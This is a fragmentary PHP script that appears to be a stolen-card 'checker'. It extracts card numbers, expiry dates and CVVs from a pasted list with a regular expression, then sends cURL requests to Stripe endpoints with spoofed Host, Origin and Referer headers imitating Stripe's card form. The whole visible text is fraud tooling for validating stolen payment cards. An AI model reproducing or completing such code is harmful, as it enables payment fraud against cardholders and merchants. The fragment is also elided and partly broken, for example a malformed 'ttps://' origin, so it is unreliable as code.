    ...
    if($antispam != False){
      ...
      return;
        ...
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            ...
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://js.stripe.com/v3/fingerprinted/img/visa-729c05c240c4bdb47b03ac81d9945bfe.svg');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
              'Host: api.stripe.com',
            ...
            if(!$stripeerror){
                ...
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  ...
                  'Host: user.js.stripe.com',
                  'Origin: ttps://js.stripe.com',
                  'Referer: https://js.stripe.com/v3/elements-inner-card-89e97d3cfc14879a80f444997476e7a6.html',
